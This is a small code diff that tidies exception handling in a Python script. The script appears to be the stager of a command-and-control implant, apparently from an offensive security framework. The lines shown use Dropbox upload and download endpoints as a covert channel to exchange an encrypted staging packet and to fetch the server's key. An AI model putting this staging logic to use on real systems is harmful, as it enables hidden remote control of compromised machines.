@@ -52,7 +52,7 @@ for headerRaw in headersRaw:
             headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
         else:
             headers[headerKey] = headerValue
-    except:
+    except Exception:
         pass
 
 headers['Authorization'] = "Bearer %s" % (t)
@@ -70,7 +70,7 @@ routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID,
 try:
     # response = post_message(postURI, routingPacket+hmacData)
     response = post_message("https://content.dropboxapi.com/2/files/upload", routingPacket)
-except:
+except Exception:
     exit()
 
 #(urllib2.urlopen(urllib2.Request(uri, data, headers))).read()
@@ -79,7 +79,7 @@ try:
     del headers['Content-Type']
     headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_2.txt\"}" % (stagingFolder, sessionID)
     raw = post_message("https://content.dropboxapi.com/2/files/download", data=None)
-except:
+except Exception:
     exit()
 # decrypt the server's public key and the server nonce
 packet = aes_decrypt_and_verify(stagingKey, raw)
